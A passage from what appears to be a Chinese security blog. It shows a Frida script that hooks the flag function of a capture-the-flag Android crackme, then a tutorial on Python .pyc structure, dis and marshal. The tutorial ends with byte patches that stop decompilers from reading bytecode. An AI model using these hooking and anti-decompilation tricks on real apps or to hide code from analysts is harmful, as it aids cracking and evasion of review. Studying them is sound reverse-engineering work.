<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys</span><br><span class="line"></span><br><span class="line">jscode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">Interceptor.attach(Module.findExportByName(&quot;libphcm.so&quot;,&quot;Java_com_ph0en1x_android_1crackme_MainActivity_getFlag&quot;),&#123; //找到libphcm.so中的getFlag()函数，函数名在ida中找</span></span><br><span class="line"><span class="string">        onEnter:function(args)&#123; //进入该函数前执行的函数，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave:function(retval)&#123; //退出该函数时执行的代码，retval是返回值，在C语言中返回的是一个`char*`，需要转化成java的string</span></span><br><span class="line"><span class="string">            var String_java = Java.use(&#x27;java.lang.String&#x27;);</span></span><br><span class="line"><span class="string">            var args_4 = Java.cast(retval, String_java);</span></span><br><span class="line"><span class="string">            send(&quot;getFlag()==&gt;&quot;+args_4);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMessage</span>(<span class="params">message,data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[*] &#123;0&#125;&#x27;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">process=frida.get_remote_device().attach(<span class="string">&#x27;com.ph0en1x.android_crackme&#x27;</span>)</span><br><span class="line">script=process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>先在手机端运行app，之后在本地执行python脚本，之后在手机端输入框随便输入:<br><img src="https://z3.ax1x.com/2021/04/15/cR97Zj.png"></p>
<p>可以看到js代码把字符串的值发回给python，之后python打印出来了。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Python字节码</title>
    <url>/2020/03/10/python-bytecode/</url>
    <content><![CDATA[<p>寒假的时候做hgame2020，借week2两道python逆向题，整理一下有关python字节码的一些东西。</p>
<h1 id="pyc文件简介"><a href="#pyc文件简介" class="headerlink" title="pyc文件简介"></a>pyc文件简介</h1><p>学过Python的都知道<code>.py</code>结尾的是Python的源码文件，<code>.pyc</code>是源码编译后生成的字节码文件，也可以运行，明明可以直接运行源码文件，这个字节码文件有什么卵用？</p>
<p>一来是为了无源文件发行，可以隐藏源码；还有就是编译后的<code>.pyc</code>文件比源码文件要快，有人说运行的时候会更快，但官方文档是这样写的：</p>
<blockquote>
<p>A program doesn’t run any faster when it is read from a <code>.pyc</code> file than when it is read from a <code>.py</code> file; the only thing that’s faster about <code>.pyc</code> files is the speed with which they are loaded.</p>
</blockquote>
<p>字节码文件运行并不会比源码文件快，主要是加载(被import)比源码文件快。</p>
<h1 id="代码对象"><a href="#代码对象" class="headerlink" title="代码对象"></a>代码对象</h1><p>先介绍一下代码对象，代码对象是 CPython 实现的低级细节。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>    print(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func.__code__</span><br><span class="line">&lt;code object func at <span class="number">0x0000015797EA3780</span>, file <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>&gt;</span><br></pre></td></tr></table></figure>

<p>这个东西就是代码对象，表示可执行Python代码或者字节码，在示例中表示函数中的代码部分，不包含对全局变量的引用和函数默认参数等其他东西(示例函数中也没有)。</p>
<p>代码对象中还有一大堆属性：</p>
<ul>
<li><p><code>co_name</code>是函数名称。</p>
</li>
<li><p><code>co_argcount</code>是位置参数的数量，包括仅限位置参数和具有默认值的参数。</p>
</li>
<li><p><code>co_kwonlyargcount</code>为仅限位置参数的数量 (包括带有默认值的参数)  Python3中有，Python2中没有</p>
</li>
<li><p><code>co_nlocals</code>是函数使用的局部变量数，包括参数。</p>
</li>
<li><p><code>co_varnames</code>是一个包含局部变量名称的元组，以参数名称开头。</p>
</li>
<li><p><code>co_cellvars</code>是一个元组，包含嵌套函数引用的局部变量的名称。</p>
</li>
<li><p><code>co_freevars</code>是一个包含自由变量名称的的元组。</p>
</li>
<li><p><code>co_code</code>是表示字节码指令序列的二进制数据。</p>
</li>
<li><p><code>co_consts</code>是一个包含字节码使用的字面值的元组。如果代码对象表示函数，则co_consts的第一项是函数的文档字符串，如果文档字符串未定义，则是None。</p>
</li>
<li><p><code>co_names</code>是一个包含字节码使用的名称的元组(不包括变量名)。</p>
</li>
<li><p><code>co_filename</code>是编译代码的文件名。</p>
</li>
<li><p><code>co_firstlineno</code>是函数的第一个行号。</p>
</li>
<li><p><code>co_lnotab</code>是一个字符串，用于编码从字节码偏移到行号的映射（更详细的信息参考解释的源代码）。</p>
</li>
<li><p><code>co_stacksize</code>是所需的堆栈大小（包括局部变量）。</p>
</li>
<li><p><code>co_flags</code> 为一个整数，其中编码了解释器所用的多个旗标。以下是可用于 <code>co_flags</code> 的标志位定义：如果函数使用 <code>*arguments</code> 语法来接受任意数量的位置参数，则 <code>0x04</code> 位被设置；如果函数使用 <code>**keywords</code> 语法来接受任意数量的关键字参数，则 <code>0x08</code> 位被设置；如果函数是一个生成器，则 <code>0x20</code> 位被设置。</p>
<p>代码对象跟分析字节码有啥关系呢？我们可以用一个dis模块把代码对象编程人类可读的字节码。</p>
</li>
</ul>
<h1 id="dis模块-—-Python-字节码反汇编器"><a href="#dis模块-—-Python-字节码反汇编器" class="headerlink" title="dis模块 — Python 字节码反汇编器"></a>dis模块 — Python 字节码反汇编器</h1><p>dis模块通过反汇编支持CPython的字节码分析。</p>
<p>这里只从官方文档以用两个常用的函数介绍，其他具体请看<a href="https://docs.python.org/zh-cn/3/library/dis.html">官方文档</a>：</p>
<ul>
<li><p><code>dis.``dis</code>(<em>x=None</em>, ***, <em>file=None</em>, <em>depth=None</em>)</p>
<p>反汇编 <em>x</em> 对象。 <em>x</em> 可以表示模块、类、方法、函数、生成器、异步生成器、协程、代码对象、源代码字符串或原始字节码的字节序列（划重点）。对于模块，它会反汇编所有功能。对于一个类，它反汇编所有方法（包括类和静态方法）。对于代码对象或原始字节码序列，它每字节码指令打印一行。它还递归地反汇编嵌套代码对象（推导式代码，生成器表达式和嵌套函数，以及用于构建嵌套类的代码）。在被反汇编之前，首先使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#compile"><code>compile()</code></a> 内置函数将字符串编译为代码对象。如果未提供任何对象，则此函数会反汇编最后一次回溯。如果提供的话，反汇编将作为文本写入提供的 <em>file</em> 参数，否则写入 <code>sys.stdout</code> 。递归的最大深度受 <em>depth</em> 限制，除非它是 <code>None</code> 。 <code>depth=0</code> 表示没有递归。<em>在 3.4 版更改:</em> 添加 <em>file</em> 形参。<em>在 3.7 版更改:</em> 实现了递归反汇编并添加了 <em>depth</em> 参数。<em>在 3.7 版更改:</em> 现在可以处理协程和异步生成器对象。</p>
</li>
<li><p><code>dis.``distb</code>(<em>tb=None</em>, ***, <em>file=None</em>)</p>
<p>如果没有传递，则使用最后一个回溯来反汇编回溯的堆栈顶部函数。 指示了导致异常的指令。如果提供的话，反汇编将作为文本写入提供的 <em>file</em> 参数，否则写入 <code>sys.stdout</code> 。<em>在 3.4 版更改:</em> 添加 <em>file</em> 形参。</p>
<p>生成人类可读字节码示例如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> dis</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line"><span class="meta">... </span>    print(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(f)</span><br><span class="line">  <span class="number">2</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="keyword">print</span>)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> POP_TOP</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">10</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>为啥要把源码搞成更难读的字节码？这其实不是我们的主要目的，因为源码一般是不会直接给我们的，dis模块也可以反汇编<code>.pyc</code>文件中原始字节码的字节序列（上面函数介绍中我有划重点）。</p>
<h1 id="marshal模块-—-内部-Python-对象序列化"><a href="#marshal模块-—-内部-Python-对象序列化" class="headerlink" title="marshal模块 — 内部 Python 对象序列化"></a>marshal模块 — 内部 Python 对象序列化</h1><p>此模块包含一此能以二进制格式来读写Python值的函数。</p>
<p>Warning：The marshal module is not intended to be secure against erroneous or maliciously constructed data. Never unmarshal data received from an untrusted or unauthenticated source.</p>
<p>也只从官方引用两个常用的函数介绍，其他细节见<a href="https://docs.python.org/zh-cn/3/library/marshal.html">官方文档</a>:</p>
<ul>
<li><p><code>marshal.``dump</code>(<em>value</em>, <em>file</em>[, <em>version</em>])</p>
<p>向打开的文件写入值。 值必须为受支持的类型。 文件必须为可写的 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-binary-file">binary file</a>。如果值具有（或所包含的对象具有）不受支持的类型，则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#ValueError"><code>ValueError</code></a> — 但是将向文件写入垃圾数据。 对象也将不能正确地通过 <a href="https://docs.python.org/zh-cn/3/library/marshal.html#marshal.load"><code>load()</code></a> 重新读取。<em>version</em> 参数指明 <code>dump</code> 应当使用的数据格式（见下文）。</p>
</li>
<li><p><code>marshal.``load</code>(<em>file</em>)</p>
<p>从打开的文件读取一个值并返回。 如果读不到有效的值（例如由于数据为不同 Python 版本的不兼容 marshal 格式），则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#EOFError"><code>EOFError</code></a>, <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#ValueError"><code>ValueError</code></a> 或 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#TypeError"><code>TypeError</code></a>。 文件必须为可读的 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-binary-file">binary file</a>。注解 如果通过 <a href="https://docs.python.org/zh-cn/3/library/marshal.html#marshal.dump"><code>dump()</code></a> marshal 了一个包含不受支持类型的对象，<a href="https://docs.python.org/zh-cn/3/library/marshal.html#marshal.load"><code>load()</code></a> 将为不可 marshal 的类型替换 <code>None</code>。</p>
</li>
</ul>
<p>简单来说marshal对于我们逆向python最大的作用就是可以从<code>.pyc</code>文件中读取Python对象，然后就可以用dis反汇编成人类可读的字节码来分析。</p>
<p>然后新的问题又来了，我们怎么从<code>.pyc</code>文件中找到代码对象的位置呢？</p>
<h1 id="pyc文件分析"><a href="#pyc文件分析" class="headerlink" title="pyc文件分析"></a>pyc文件分析</h1><p>根据不同的Python版本<code>.pyc</code>文件的格式也会有所变化，。</p>
<h2 id="Python2-7"><a href="#Python2-7" class="headerlink" title="Python2.7"></a>Python2.7</h2><p>我们先随便写一个py文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&#x27;ssss&#x27;</span></span><br><span class="line">i=<span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">	s=<span class="string">&#x27;ss&#x27;</span></span><br><span class="line">	i=<span class="number">66</span></span><br><span class="line">	print(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f()</span><br></pre></td></tr></table></figure>

<p><code>python -m test.py</code>编译生成<code>.pyc</code>文件</p>
<p>十六进制打开：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Challenges# hexdump -C test.pyc</span><br><span class="line">00000000  03 f3 0d 0a d4 c0 22 5e  63 00 00 00 00 00 00 00  |......&quot;^c.......|</span><br><span class="line">00000010  00 01 00 00 00 40 00 00  00 73 20 00 00 00 64 00  |.....@...s ...d.|</span><br><span class="line">00000020  00 5a 00 00 64 01 00 5a  01 00 64 02 00 84 00 00  |.Z..d..Z..d.....|</span><br><span class="line">00000030  5a 02 00 65 02 00 83 00  00 01 64 03 00 53 28 04  |Z..e......d..S(.|</span><br><span class="line">00000040  00 00 00 74 04 00 00 00  73 73 73 73 69 9a 02 00  |...t....ssssi...|</span><br><span class="line">00000050  00 63 00 00 00 00 02 00  00 00 01 00 00 00 43 00  |.c............C.|</span><br><span class="line">00000060  00 00 73 15 00 00 00 64  01 00 7d 00 00 64 02 00  |..s....d..&#125;..d..|</span><br><span class="line">00000070  7d 01 00 64 03 00 47 48  64 00 00 53 28 04 00 00  |&#125;..d..GHd..S(...|</span><br><span class="line">00000080  00 4e 74 02 00 00 00 73  73 69 42 00 00 00 74 05  |.Nt....ssiB...t.|</span><br><span class="line">00000090  00 00 00 68 65 6c 6c 6f  28 00 00 00 00 28 02 00  |...hello(....(..|</span><br><span class="line">000000a0  00 00 74 01 00 00 00 73  74 01 00 00 00 69 28 00  |..t....st....i(.|</span><br><span class="line">000000b0  00 00 00 28 00 00 00 00  73 07 00 00 00 74 65 73  |...(....s....tes|</span><br><span class="line">000000c0  74 2e 70 79 74 01 00 00  00 66 04 00 00 00 73 06  |t.pyt....f....s.|</span><br><span class="line">000000d0  00 00 00 00 01 06 01 06  01 4e 28 03 00 00 00 52  |.........N(....R|</span><br><span class="line">000000e0  03 00 00 00 52 04 00 00  00 52 05 00 00 00 28 00  |....R....R....(.|</span><br><span class="line">000000f0  00 00 00 28 00 00 00 00  28 00 00 00 00 73 07 00  |...(....(....s..|</span><br><span class="line">00000100  00 00 74 65 73 74 2e 70  79 74 08 00 00 00 3c 6d  |..test.pyt....&lt;m|</span><br><span class="line">00000110  6f 64 75 6c 65 3e 01 00  00 00 73 06 00 00 00 06  |odule&gt;....s.....|</span><br><span class="line">00000120  01 06 02 09 05                                    |.....|</span><br><span class="line">00000125</span><br></pre></td></tr></table></figure>

<p>这些密密麻麻的数据分别代表什么意思，先按顺序列一个表，再详细讲解：</p>
<table>
<thead>
<tr>
<th align="center">字段</th>
<th align="center">长度（默认最低长度）</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MagicNumber</td>
<td align="center">4字节</td>
<td align="center">魔数，区别不同版本的Python字节码</td>
</tr>
<tr>
<td align="center">时间戳</td>
<td align="center">4字节</td>
<td align="center">最后修改时间</td>
</tr>
<tr>
<td align="center">TYPE_CODE</td>
<td align="center">1字节</td>
<td align="center">这里是’c’，表示接下来是一个CodeObject，见<a href="https://github.com/python/cpython/blob/master/Python/marshal.c">Cpython源码</a></td>
</tr>
<tr>
<td align="center">co_argcount</td>
<td align="center">4字节</td>
<td align="center">后面一堆属性上面代码对象都有讲，我就不重复写了</td>
</tr>
<tr>
<td align="center">co_nlocals</td>
<td align="center">4字节</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">co_stacksize</td>
<td align="center">4字节</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">co_flags</td>
<td align="center">4字节</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">TYPE_STRING</td>
<td align="center">byte</td>
<td align="center">这里是’s’，表示接下来是一个string，也就是co_code</td>
</tr>
<tr>
<td align="center">co_code size</td>
<td align="center">4字节</td>
<td align="center">co_code的长度，这里是0x20(小端序)</td>
</tr>
<tr>
<td align="center">co_code value</td>
<td align="center">根据上面的size确定字节数</td>
<td align="center">co_code的值</td>
</tr>
<tr>
<td align="center">TYPE_TUPLE</td>
<td align="center">1字节</td>
<td align="center">这里是’(‘，表示接下来是一个元组，也就是co_consts</td>
</tr>
<tr>
<td align="center">co_consts size</td>
<td align="center">4字节</td>
<td align="center">这里是4，表示co_consts的元组中4个值，接下来就挨个表示这些值</td>
</tr>
<tr>
<td align="center">co_consts[0] TYPE</td>
<td align="center">1字节</td>
<td align="center">这里是’t’，表示co_consts[0]是一个int</td>
</tr>
<tr>
<td align="center">co_const[0] value</td>
<td align="center">4字节</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">co_consts[1] TYPE</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">co_consts[1] size</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">co_consts[1] value</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p><code>co_consts</code>结束后是<code>co_names</code>,<code>co_varnames</code>,<code>co_freevars</code>,<code>co_cellvars</code>结构与<code>co_consts</code>相同，需要提一下如果元组中的数据类型是整形就不需要再标明长度，默认是4字节。</p>
<p>上面几个属性结束之后是<code>co_filename</code>在示例中偏移为<code>0xfd</code>处（因为前几个属性长度不同，此字段位置不确定），在这里是<code>&#39;s&#39;</code>,表示<code>TYPE_STRING</code>，然后是长度为7，然后是文件名<code>test.py</code>；之后是<code>co_name</code>,<code>co_firstlineno</code>,<code>co_lnotab</code>。</p>
<p>还有实例中偏移<code>0x51</code>的位置又有一个<code>&#39;c&#39;</code>，是因为CodeObject中的<code>co_consts</code>中有另一个CodeObject，也就是源码中的<code>f()</code>函数，之后会递归分析<code>f()</code>函数，然后再返回继续分析上层CodeObject剩下的内容，方法一样。</p>
<p>总结在<code>.pyc</code>文件中对象的储存方式就是  <strong>类型表示 长度 值</strong>  这样的格式。</p>
<h2 id="Python3-7"><a href="#Python3-7" class="headerlink" title="Python3.7"></a>Python3.7</h2><p>还是先整个示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Challenges&#x2F;__pycache__# hexdump -C test.cpython-37.pyc </span><br><span class="line">00000000  42 0d 0d 0a 00 00 00 00  d4 c0 22 5e 3c 00 00 00  |B.........&quot;^&lt;...|</span><br><span class="line">00000010  e3 00 00 00 00 00 00 00  00 00 00 00 00 02 00 00  |................|</span><br><span class="line">00000020  00 40 00 00 00 73 1a 00  00 00 64 00 5a 00 64 01  |.@...s....d.Z.d.|</span><br><span class="line">00000030  5a 01 64 02 64 03 84 00  5a 02 65 02 83 00 01 00  |Z.d.d...Z.e.....|</span><br><span class="line">00000040  64 04 53 00 29 05 5a 04  73 73 73 73 69 9a 02 00  |d.S.).Z.ssssi...|</span><br><span class="line">00000050  00 63 00 00 00 00 00 00  00 00 02 00 00 00 02 00  |.c..............|</span><br><span class="line">00000060  00 00 43 00 00 00 73 14  00 00 00 64 01 7d 00 64  |..C...s....d.&#125;.d|</span><br><span class="line">00000070  02 7d 01 74 00 64 03 83  01 01 00 64 00 53 00 29  |.&#125;.t.d.....d.S.)|</span><br><span class="line">00000080  04 4e 5a 02 73 73 e9 42  00 00 00 5a 05 68 65 6c  |.NZ.ss.B...Z.hel|</span><br><span class="line">00000090  6c 6f 29 01 da 05 70 72  69 6e 74 29 02 da 01 73  |lo)...print)...s|</span><br><span class="line">000000a0  da 01 69 a9 00 72 05 00  00 00 fa 18 2f 72 6f 6f  |..i..r......&#x2F;roo|</span><br><span class="line">000000b0  74 2f 43 68 61 6c 6c 65  6e 67 65 73 2f 74 65 73  |t&#x2F;Challenges&#x2F;tes|</span><br><span class="line">000000c0  74 2e 70 79 da 01 66 04  00 00 00 73 06 00 00 00  |t.py..f....s....|</span><br><span class="line">000000d0  00 01 04 01 04 01 72 07  00 00 00 4e 29 03 72 03  |......r....N).r.|</span><br><span class="line">000000e0  00 00 00 72 04 00 00 00  72 07 00 00 00 72 05 00  |...r....r....r..|</span><br><span class="line">000000f0  00 00 72 05 00 00 00 72  05 00 00 00 72 06 00 00  |..r....r....r...|</span><br><span class="line">00000100  00 da 08 3c 6d 6f 64 75  6c 65 3e 01 00 00 00 73  |...&lt;module&gt;....s|</span><br><span class="line">00000110  06 00 00 00 04 01 04 02  08 05                    |..........|</span><br><span class="line">0000011a</span><br></pre></td></tr></table></figure>



<p>Python3.7开始<code>.pyc</code>的文件头有4个32-bit words，第一个word还是魔数，如果第二个是0，那么第三个就是时间戳，第四个是文件大小，如果第二个word的最低为设置为1，那么该<code>.pyc</code>文件就是一个基于哈希的字节码文件，后两个words就是一个64-bit的哈希值。示例中第二个word就为0。具体细节看<a href="https://www.python.org/dev/peps/pep-0552/#specification">官方文档</a>。</p>
<p>之后就是CodeObject，3.7<code>.pyc</code>中的CodeObject开头是一个<code>0xe3</code>，表示接下来就是CodeObject(2.7中这里是<code>&#39;c&#39;</code>)，之后接着是五个32-bit的word，依次是<code>co_argcount</code>,<code>co_kwonlyargcount</code>,<code>co_nlocals</code>,<code>co_stacksize</code>,<code>co_flags</code>，比Python2.7多一个<code>co_kwonlyargcount</code>，示例中在偏移为<code>0x15</code>的位置。</p>
<p>然后<code>&#39;s&#39;</code>是类型标识，表示接下来是co_code(代码段)，然后是长度，在示例中是<code>0x1a</code>。</p>
<p>代码段之后 是<code>co_consts</code>等，格式与2.7版本基本大同小异。</p>
<p>总结一些我发现的两个版本不同的地方（可能并不完全）：</p>
<ol>
<li>Python3.7版本文件头是4个32-bit word，2.7是两个；</li>
<li>Pyhon3.7版本在<code>co_argcount</code>字段后面多了一个<code>co_kwonlyargcount</code>字段，长度为4bytes；</li>
<li>Python3.7中主函数的CodeObject开始的标识是<code>0xe3</code>,内层CodeObject开始标识是<code>&#39;c&#39;</code>，2.7全是<code>&#39;c&#39;</code>；</li>
<li>Python3.7中元组的类型标识是<code>&#39;)&#39;</code>,2.7中是<code>&#39;(&#39;</code>；</li>
<li>Python3.7中字符串的类型标识为<code>&#39;Z&#39;</code>，2.7是<code>&#39;s&#39;</code>;</li>
<li>Python3.7中元组和字符串等的的size字段默认最少是1byte，2.7中是4byte。</li>
</ol>
<p>还是找到CodeObject的位置用dis和marshal分析，整个样例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import dis,marshal</span><br><span class="line">&gt;&gt;&gt; f&#x3D;open(&#39;Pyc.pyc&#39;,&#39;rb&#39;)</span><br><span class="line">&gt;&gt;&gt; f.read(16)</span><br><span class="line">b&#39;B\r\r\n\x00\x00\x00\x00\xdaR%^ \x04\x00\x00&#39;</span><br><span class="line">&gt;&gt;&gt; code&#x3D;marshal.load(f)</span><br><span class="line">&gt;&gt;&gt; dis.dis(code)</span><br><span class="line">  3           0 JUMP_ABSOLUTE            2</span><br><span class="line">        &gt;&gt;    2 LOAD_CONST               0 (0)</span><br><span class="line">              4 LOAD_CONST               1 (None)</span><br><span class="line">              6 IMPORT_NAME              0 (os)</span><br><span class="line">              8 STORE_NAME               0 (os)</span><br><span class="line">             10 LOAD_CONST               0 (0)</span><br><span class="line">             .......</span><br></pre></td></tr></table></figure>

<p>至此，我们基本可以把可读字节码给搞出来了，然后我们来看怎么读。</p>
<h1 id="Python字节码说明"><a href="#Python字节码说明" class="headerlink" title="Python字节码说明"></a>Python字节码说明</h1><p>还是先整一个样例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> dis</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line"><span class="meta">... </span>    print(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(f)</span><br><span class="line">  <span class="number">2</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="keyword">print</span>)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> POP_TOP</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">10</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>反汇编出来的可读字节码有5列：</p>
<p>第一列： 示例中的“2”，在源代码中的行数；</p>
<p>第二列： 语句在co_code中的偏移；</p>
<p>第三列： opcode，操作码，在示例中被换成了对应的opname，方便阅读，opcode与opname的对应可以在python的opcode模块中查看也可以查看<a href="https://github.com/python/cpython/blob/master/Lib/opcode.py">官方源码</a>；</p>
<p>第四列： 操作数，有的opcode没有操作数；</p>
<p>第五列： 操作数的实际值（自动注释）；</p>
<p>在3.6版本中修改：每条指令使用2字节，以前根据指令的不同长度也不同，上面示例是3.7版本的，可以看出每一句的偏移+2。</p>
<p>Python字节码是完全面向栈的，没有寄存器什么的。</p>
<p>用TOS表示栈顶值，TOS1表示栈顶下1个地址的值，TOS2表示栈顶下2个地址的值……</p>
<p>各opname对应的具体操作见<a href="https://docs.python.org/zh-cn/3.8/library/dis.html">dis官方文档</a></p>
<p>这里解释一下第五列的实际数值和第四列的操作数有什么关系，如果操作数是一个字面值(比如opname为<code>LOAD_CONST</code>)，那么之前说了，CodeObject中有一个<code>co_consts</code>是一个储存了所有字面值的元组，那第四列的操作数就是该字面值在元组中的下标(从0开始)，局部变量，全局变量等同理，不过反正第五列会自动注释出来的，也不用自己去查；如果操作数没有在这些元组里，比如示例中的<code>CALL_FUNCTION  1</code>,表示以TOS为参数调用TOS1的函数，就没有第五列。</p>
<h1 id="Python字节码混淆"><a href="#Python字节码混淆" class="headerlink" title="Python字节码混淆"></a>Python字节码混淆</h1><p>没有经过任何处理的<code>.pyc</code>文件可以直接用在线工具或者uncompyle6反编译出<code>.py</code>源码，也可以用marshal和dis反汇编出可读字节码，对大佬来说可读字节码就和源码一样。我们可以在编译好的<code>.pyc</code>文件上加一些东西来阻止uncompyle6和dis等工具的逆向。(下面的例子只是例子，可以自己灵活处理，也可以搭配食用)</p>
<h2 id="加跳转-可对抗uncompyle6"><a href="#加跳转-可对抗uncompyle6" class="headerlink" title="加跳转(可对抗uncompyle6)"></a>加跳转(可对抗uncompyle6)</h2><p>在代码段(co_code)开头的位置加一个跳转跳到第二句(原本的第一句)，提一下无条件跳转的opcode是<code>0x71</code>,但是要注意版本，因为2.7版本中这条指令是3字节长度，3.7中是2字节长度。</p>
<p>所以2.7版本加三个字节<code>0x71 0x03 0x00</code>,记得改前面的co_code_size字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1           0 JUMP_ABSOLUTE            3</span><br><span class="line">      &gt;&gt;    3 LOAD_CONST               0 (&#39;helloworld&#39;)</span><br><span class="line">            6 PRINT_ITEM</span><br><span class="line">            7 PRINT_NEWLINE</span><br><span class="line">            8 LOAD_CONST               1 (None)</span><br><span class="line">           11 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>3.7版本加两个字节<code>0x71 0x02</code>，记得改前面的co_code_size字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1           0 JUMP_ABSOLUTE            2</span><br><span class="line">      &gt;&gt;    2 LOAD_CONST               0 (1099511627775)</span><br><span class="line"></span><br><span class="line">2           4 STORE_NAME               0 (a)</span><br><span class="line">            6 LOAD_CONST               1 (&#39;0&#39;)</span><br><span class="line">            8 LOAD_CONST               0 (1099511627775)</span><br><span class="line">           10 BINARY_MULTIPLY</span><br><span class="line">           12 STORE_NAME               1 (s)</span><br><span class="line">           14 LOAD_CONST               2 (None)</span><br><span class="line">           16 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>很明显这个跳转是无意义的，但加了之后uncompyle6就无法直接反编译出源码，但可以反编译出不完整的可读字节码。</p>
<p>这种方法混淆的字节码还是可以用marshal和dis来分析。</p>
<h2 id="加跳转和错误语句-可对抗dis和uncompyle6"><a href="#加跳转和错误语句-可对抗dis和uncompyle6" class="headerlink" title="加跳转和错误语句(可对抗dis和uncompyle6)"></a>加跳转和错误语句(可对抗dis和uncompyle6)</h2><p>在字节码中手动加入错误的语句,再加个跳转跳过这条错误语句，因为dis分析的时候不会跳转，而程序运行会跳转，这样就可以阻止dis反汇编出可读字节码。错误语句可以压栈一个很大的操作数，超出元组的下标就会报错。</p>
<p>还是要注意版本。</p>
<p>2.7加<code>0x71 0x06 0x00 0x64 0xff 0xff</code>,记得改前面的co_code_size字段，然后dis分析就会添加的错误语句处报错，无法反汇编后面的代码。</p>
<p>3.7加<code>0x71 0x04 0x64 0xff</code>，改长度。</p>
<p>3.7版本的示例手动还原后是这样的：</p>
